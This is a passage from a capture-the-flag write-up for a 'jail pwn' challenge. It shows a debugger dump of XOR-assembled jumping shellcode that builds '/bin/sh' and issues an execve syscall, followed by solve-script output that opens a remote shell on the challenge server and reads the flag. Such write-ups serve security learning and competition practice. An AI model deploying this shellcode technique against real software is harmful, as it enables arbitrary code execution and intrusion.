   0x0000000000001185 <+92>:	movabs rax,0x6eb9090622fbb66
   0x000000000000118f <+102>:	xor    QWORD PTR [rbp-0x38],rax
   0x0000000000001193 <+106>:	movabs rax,0x6eb909090909053
   0x000000000000119d <+116>:	xor    QWORD PTR [rbp-0x40],rax
   0x00000000000011a1 <+120>:	movabs rax,0x6eb909090c03148
   0x00000000000011ab <+130>:	xor    QWORD PTR [rbp-0x48],rax
   0x00000000000011af <+134>:	movabs rax,0x6eb909090903bb0
   0x00000000000011b9 <+144>:	xor    QWORD PTR [rbp-0x50],rax
   0x00000000000011bd <+148>:	movabs rax,0x6eb909090d23148
   0x00000000000011c7 <+158>:	xor    QWORD PTR [rbp-0x58],rax
   0x00000000000011cb <+162>:	movabs rax,0x6eb909090f63148
   0x00000000000011d5 <+172>:	xor    QWORD PTR [rbp-0x60],rax
   0x00000000000011d9 <+176>:	movabs rax,0x6eb909090e78948
   0x00000000000011e3 <+186>:	xor    QWORD PTR [rbp-0x68],rax
   0x00000000000011e7 <+190>:	movabs rax,0x6eb90909090050f
   0x00000000000011f1 <+200>:	xor    QWORD PTR [rbp-0x70],rax
   0x00000000000011f5 <+204>:	mov    rax,QWORD PTR [rip+0x2c04]        # 0x3e00
   0x00000000000011fc <+211>:	xor    QWORD PTR [rbp-0x78],rax
   0x0000000000001200 <+215>:	mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000001204 <+219>:	xor    rax,0x13
   0x0000000000001208 <+223>:	mov    QWORD PTR [rbp-0x78],rax
   0x000000000000120c <+227>:	mov    rax,QWORD PTR [rbp-0x78]
   0x0000000000001210 <+231>:	jmp    rax
End of assembler dump.
```

Where `$rax` will point to `0x1133` at the `jmp rax` instruction, jumping into our jumping shellcode:

```py
gef> x/4i 0x1133
   0x1133 <main+10>:	mov    bx,0x68
   0x1137 <main+14>:	nop
   0x1138 <main+15>:	nop
   0x1139 <main+16>:	jmp    0x1141 <main+24>
gef> x/3i 0x1141
   0x1141 <main+24>:	shl    rbx,0x10
   0x1145 <main+28>:	xor    eax,eax
   0x1147 <main+30>:	jmp    0x114f <main+38>
gef> x/4i 0x114f
   0x114f <main+38>:	mov    bx,0x732f
   0x1153 <main+42>:	nop
   0x1154 <main+43>:	nop
   0x1155 <main+44>:	jmp    0x115d <main+52>
gef> x/3i 0x115d
   0x115d <main+52>:	shl    rbx,0x10
   0x1161 <main+56>:	xor    ecx,ecx
   0x1163 <main+58>:	jmp    0x116b <main+66>
gef> x/4i 0x116b
   0x116b <main+66>:	mov    bx,0x6e69
   0x116f <main+70>:	nop
   0x1170 <main+71>:	nop
   0x1171 <main+72>:	jmp    0x1179 <main+80>
gef> x/3i 0x1179
   0x1179 <main+80>:	shl    rbx,0x10
   0x117d <main+84>:	xor    edx,edx
   0x117f <main+86>:	jmp    0x1187 <main+94>
gef> x/4i 0x1187
   0x1187 <main+94>:	mov    bx,0x622f
   0x118b <main+98>:	nop
   0x118c <main+99>:	nop
   0x118d <main+100>:	jmp    0x1195 <main+108>
gef> x/7i 0x1195
   0x1195 <main+108>:	push   rbx
   0x1196 <main+109>:	nop
   0x1197 <main+110>:	nop
   0x1198 <main+111>:	nop
   0x1199 <main+112>:	nop
   0x119a <main+113>:	nop
   0x119b <main+114>:	jmp    0x11a3 <main+122>
gef> x/5i 0x11a3
   0x11a3 <main+122>:	xor    rax,rax
   0x11a6 <main+125>:	nop
   0x11a7 <main+126>:	nop
   0x11a8 <main+127>:	nop
   0x11a9 <main+128>:	jmp    0x11b1 <main+136>
gef> x/6i 0x11b1
   0x11b1 <main+136>:	mov    al,0x3b
   0x11b3 <main+138>:	nop
   0x11b4 <main+139>:	nop
   0x11b5 <main+140>:	nop
   0x11b6 <main+141>:	nop
   0x11b7 <main+142>:	jmp    0x11bf <main+150>
gef> x/5i 0x11bf
   0x11bf <main+150>:	xor    rdx,rdx
   0x11c2 <main+153>:	nop
   0x11c3 <main+154>:	nop
   0x11c4 <main+155>:	nop
   0x11c5 <main+156>:	jmp    0x11cd <main+164>
gef> x/5i 0x11cd
   0x11cd <main+164>:	xor    rsi,rsi
   0x11d0 <main+167>:	nop
   0x11d1 <main+168>:	nop
   0x11d2 <main+169>:	nop
   0x11d3 <main+170>:	jmp    0x11db <main+178>
gef> x/5i 0x11db
   0x11db <main+178>:	mov    rdi,rsp
   0x11de <main+181>:	nop
   0x11df <main+182>:	nop
   0x11e0 <main+183>:	nop
   0x11e1 <main+184>:	jmp    0x11e9 <main+192>
gef> x/i 0x11e9
   0x11e9 <main+192>:	syscall
```

```
$ python sol.py
[+] Opening connection to challs2.pyjail.club on port 23030: Done
[*] Switching to interactive mode
lets do it
$ cat /flag*
jail{play_stupid_games_win_stupid_prizes_11d01bf3}
```

This was a fun challenge! More jail pwn next time please :)
